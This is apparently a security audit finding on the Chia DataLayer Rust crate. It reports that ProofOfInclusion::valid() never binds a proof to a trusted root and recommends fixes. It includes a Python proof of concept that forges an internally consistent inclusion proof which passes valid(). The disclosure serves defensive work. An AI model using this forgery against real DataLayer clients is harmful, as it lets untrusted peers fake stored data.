### Title
`ProofOfInclusion::valid()` Final Root-Hash Check Is a Tautology — Forged Proofs Always Pass Without External Root Binding - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` in the DataLayer crate contains a tautological final check: after iterating through all layers and accumulating `existing_hash`, it compares `existing_hash == self.root_hash()`, where `root_hash()` returns `last.combined_hash` — the exact same value `existing_hash` was just set to inside the loop. The check is always `true` when layers are non-empty. As a result, `valid()` only verifies internal hash-chain consistency but never binds the proof to any externally trusted root. An unprivileged attacker can construct a `ProofOfInclusion` from serialized bytes or Python objects that proves inclusion of an arbitrary leaf in an attacker-chosen tree root, and `valid()` will accept it.

### Finding Description

`ProofOfInclusion::valid()` is implemented as follows:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;   // ← existing_hash := layer.combined_hash
    }

    existing_hash == self.root_hash()      // ← root_hash() := last.combined_hash
}
``` [1](#0-0) 

After the loop body verifies `calculated_hash == layer.combined_hash` and then sets `existing_hash = calculated_hash`, `existing_hash` holds exactly `last.combined_hash`. `root_hash()` is defined as:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash   // ← same value
    } else {
        self.node_hash
    }
}
``` [2](#0-1) 

So the final comparison is `last.combined_hash == last.combined_hash`, which is unconditionally `true`. The function never compares the computed root against any externally supplied, trusted root hash. The same tautology applies to the zero-layer case: `existing_hash` stays `self.node_hash` and `root_hash()` returns `self.node_hash`.

`ProofOfInclusion` is a `Streamable` type with `from_bytes` / `from_bytes_unchecked` deserialization and is exposed to Python via `pyclass(get_all, from_py_object)`: [3](#0-2) [4](#0-3) 

An attacker can therefore supply a crafted `ProofOfInclusion` (via network bytes or Python construction) with:
- An arbitrary `node_hash` (the leaf they wish to "prove" is present)
- Arbitrary `other_hash` / `other_hash_side` values per layer
- `combined_hash` values computed as `internal_hash(prev, side, other)` to satisfy the per-layer check

Such a proof passes `valid()` while proving inclusion in a completely attacker-controlled tree root, not the actual DataLayer tree root.

The `internal_hash` function used is: [5](#0-4) 

### Impact Explanation

Any DataLayer client or verifier that calls `proof.valid()` as its sole check — without separately comparing `proof.root_hash()` against the on-chain committed root — will accept forged inclusion proofs. This allows an untrusted peer to prove that an arbitrary key-value pair is present in a DataLayer store when it is not, corrupting the client's view of DataLayer state. This matches the allowed High impact: **DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion or lets untrusted input prove invalid state.**

### Likelihood Explanation

The `valid()` method is the only verification primitive exposed to callers (both Rust and Python). The API design — a single `valid()` call returning `bool` — strongly implies it is a complete check. Nothing in the method signature or documentation signals that callers must additionally compare `proof.root_hash()` against a trusted external root. The Python stub exposes `valid()` and `root_hash()` as separate methods with no indication of required pairing: [6](#0-5) 

All existing tests call only `assert proof_of_inclusion.valid()` without a root-hash cross-check, reinforcing the misuse pattern: [7](#0-6) 

### Recommendation

1. **Add an external root parameter to `valid()`**: Change the signature to `pub fn valid(&self, expected_root: &Hash) -> bool` and replace the final tautological check with `existing_hash == *expected_root`. This makes the API impossible to misuse.
2. **Alternatively**, rename the current function to `is_internally_consistent()` and add a separate `verify_against_root(root: &Hash) -> bool` that calls `is_internally_consistent() && self.root_hash() == *root`.
3. Update all Python bindings and stubs to reflect the new signature.
4. Add a test that constructs a forged `ProofOfInclusion` (internally consistent but with a wrong root) and confirms it is rejected.

### Proof of Concept

```python
from chia_rs.datalayer import (
    ProofOfInclusion, ProofOfInclusionLayer, MerkleBlob, KeyId, ValueId
)
import hashlib

def internal_hash(left: bytes, right: bytes) -> bytes:
    return hashlib.sha256(b"\x02" + left + right).digest()

# Attacker wants to "prove" that fake_leaf_hash is in the tree.
fake_leaf_hash = bytes(range(32))          # arbitrary leaf
other_hash     = bytes(range(32, 64))      # arbitrary sibling

# Build one layer: combined = internal_hash(fake_leaf, other_hash, side=Right)
combined = internal_hash(fake_leaf_hash, other_hash)

layer = ProofOfInclusionLayer(
    other_hash_side=1,          # Right
    other_hash=other_hash,
    combined_hash=combined,
)

forged_proof = ProofOfInclusion(
    node_hash=fake_leaf_hash,
    layers=[layer],
)

# valid() returns True even though this proof was never generated
# from any real MerkleBlob and the root is attacker-controlled.
assert forged_proof.valid(), "forged proof should pass (demonstrates the bug)"
print("root claimed by forged proof:", forged_proof.root_hash().hex())
# This root is attacker-controlled, not the actual DataLayer tree root.
```

The forged proof passes `valid()` because the per-layer check `calculated_hash == layer.combined_hash` is satisfied by construction, and the final check `existing_hash == self.root_hash()` reduces to `combined == combined`.

### Citations

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L20-29)
```rust
#[cfg_attr(
    feature = "py-bindings",
    pyclass(get_all, from_py_object),
    derive(PyJsonDict, PyStreamable)
)]
#[derive(Clone, Debug, std::hash::Hash, Eq, PartialEq, Streamable)]
pub struct ProofOfInclusion {
    pub node_hash: Hash,
    pub layers: Vec<ProofOfInclusionLayer>,
}
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L32-38)
```rust
    pub fn root_hash(&self) -> Hash {
        if let Some(last) = self.layers.last() {
            last.combined_hash
        } else {
            self.node_hash
        }
    }
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L40-58)
```rust
    pub fn valid(&self) -> bool {
        let mut existing_hash = self.node_hash;

        for layer in &self.layers {
            let calculated_hash = crate::calculate_internal_hash(
                &existing_hash,
                layer.other_hash_side,
                &layer.other_hash,
            );

            if calculated_hash != layer.combined_hash {
                return false;
            }

            existing_hash = calculated_hash;
        }

        existing_hash == self.root_hash()
    }
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L123-123)
```rust
                assert!(proof_of_inclusion.valid());
```

**File:** wheel/python/chia_rs/datalayer.pyi (L236-266)
```text
@final
class ProofOfInclusion:
    node_hash: bytes32
    # children before parents
    layers: list[ProofOfInclusionLayer]

    def root_hash(self) -> bytes32: ...
    def valid(self) -> bool: ...

    def __new__(cls, node_hash: bytes32, layers: list[ProofOfInclusionLayer]) -> ProofOfInclusion: ...

    # TODO: generate
    def __hash__(self) -> int: ...
    def __repr__(self) -> str: ...
    def __deepcopy__(self, memo: object) -> Self: ...
    def __copy__(self) -> Self: ...
    @classmethod
    def from_bytes(cls, blob: bytes) -> Self: ...
    @classmethod
    def from_bytes_unchecked(cls, blob: bytes) -> Self: ...
    @classmethod
    def parse_rust(cls, blob: ReadableBuffer, trusted: bool = False) -> tuple[Self, int]: ...
    def to_bytes(self) -> bytes: ...
    def __bytes__(self) -> bytes: ...
    def stream_to_bytes(self) -> bytes: ...
    def get_hash(self) -> bytes32: ...
    def to_json_dict(self) -> dict[str, Any]: ...
    @classmethod
    def from_json_dict(cls, json_dict: dict[str, Any]) -> Self: ...
    def replace(self, *, node_hash: bytes32 = ..., layers: list[ProofOfInclusionLayer] = ...) -> Self: ...
    def truncate(self, field: str, length: int) -> None: ...
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L48-62)
```rust
pub fn internal_hash(left_hash: &Hash, right_hash: &Hash) -> Hash {
    let mut hasher = Sha256::new();
    hasher.update(b"\x02");
    hasher.update(left_hash.0);
    hasher.update(right_hash.0);

    Hash(Bytes32::new(hasher.finalize()))
}

pub fn calculate_internal_hash(hash: &Hash, other_hash_side: Side, other_hash: &Hash) -> Hash {
    match other_hash_side {
        Side::Left => internal_hash(other_hash, hash),
        Side::Right => internal_hash(hash, other_hash),
    }
}
```
